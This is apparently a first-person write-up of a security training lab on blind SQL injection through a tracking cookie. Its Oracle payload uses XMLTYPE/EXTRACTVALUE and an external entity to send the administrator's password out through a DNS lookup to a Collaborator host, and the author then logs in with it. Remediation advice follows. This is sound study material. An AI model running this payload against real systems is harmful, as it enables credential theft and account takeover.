# Lab: Blind SQL Injection with Out-of-Band Data Exfiltration

**Difficulty:** Practitioner  
**Status:** Solved  
**Category:** Blind SQL Injection / OAST / Data Exfiltration

## Objective

Exploit the SQL injection vulnerability in the tracking cookie to retrieve the `administrator` user's password through Burp Collaborator, then log in as the administrator.

## Lab Solving Steps

### Step 1: Intercept the Request

I refreshed the lab homepage and intercepted the request using Burp Suite.

### Step 2: Send the Request to Repeater

I sent the intercepted request to **Burp Repeater** and located the `TrackingId` cookie, which was vulnerable to SQL injection.

### Step 3: Inject the Payload

I modified the `TrackingId` cookie with the following payload:

```
' UNION SELECT EXTRACTVALUE(
  xmltype(
    '<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY % remote SYSTEM
      "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/">
      %remote;
    ]>'
  ),
  '/l'
) FROM dual--
```

I replaced `YOUR-COLLABORATOR-ID.oastify.com` with my Burp Collaborator domain.

The payload retrieves the administrator's password from the `users` table and incorporates it into the hostname used for the external interaction.
![[Pasted image 20261015091134.png]]
### Step 4: Retrieve the Password

I sent the modified request, then opened **Burp Collaborator** and checked for interactions.

The administrator's password appeared as part of the Collaborator interaction details. I copied the password from the received interaction.
![[Pasted image 20261015091113.png]]
### Step 5: Log In as Administrator

I returned to the lab's login page, entered the username `administrator` and the retrieved password, and logged in successfully.

**Boom — lab solved!**
![[Pasted image 20261015091045.png]]
## What I Learned

- Blind SQL injection can expose database information even when query results are not displayed in the application response.
    
- Out-of-band data exfiltration can send extracted information through an external DNS lookup.
    
- Oracle-specific functions such as `EXTRACTVALUE` and `XMLTYPE` can be abused in vulnerable configurations.
    
- Burp Collaborator helps detect external interactions and inspect data embedded in interaction details.
    
- SQL injection can expose sensitive credentials and lead to account compromise.
    

## Remediation

- Use parameterized SQL queries to prevent injection.
    
- Never concatenate untrusted cookie values into SQL statements.
    
- Restrict database accounts to the minimum permissions required.
    
- Disable unnecessary XML external-entity processing.
    
- Restrict outbound DNS and network traffic from database servers.
    

## Conclusion

I exploited the tracking-cookie SQL injection, extracted the administrator's password through Burp Collaborator, and used the credentials to log in as the administrator.

**Key takeaway:** Blind SQL injection can lead to complete account compromise when an attacker can exfiltrate sensitive database values through out-of-band interactions.